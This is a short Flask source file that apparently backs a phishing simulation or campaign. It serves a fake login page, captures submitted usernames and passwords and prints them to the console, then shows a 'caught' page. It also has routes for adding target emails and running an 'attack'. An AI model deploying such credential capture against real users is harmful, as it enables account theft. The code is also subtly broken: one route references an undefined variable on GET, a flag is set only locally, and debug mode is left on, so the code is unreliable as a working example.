from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route("/", methods = ["GET", "POST"])
def hello_world():
    if request.method == "POST":
        req = request.form
        login = req["login"]
        psw = req["password"]
        print(req)
        return redirect("/caught")

    return render_template("login.html")

@app.route("/caught/")
def user_caught():
    return render_template("caught.html")
attack_in_progress = 0
@app.route("/addmail/", methods = ["GET", "POST"])
def add_mail():
    if request.method == "POST":
        req = request.form
        print(req)
        temp = 1
    if temp == 1:
        return render_template("progress.html")      
    return render_template("addmail.html")

@app.route("/cont/", methods = ["GET", "POST"])
def attack():
    if request.method == "POST":
        req = request.form
        print(req)
        attack_in_progress = 0
        
    return render_template("progress.html")

if __name__=="__main__":
    app.run(debug=True)
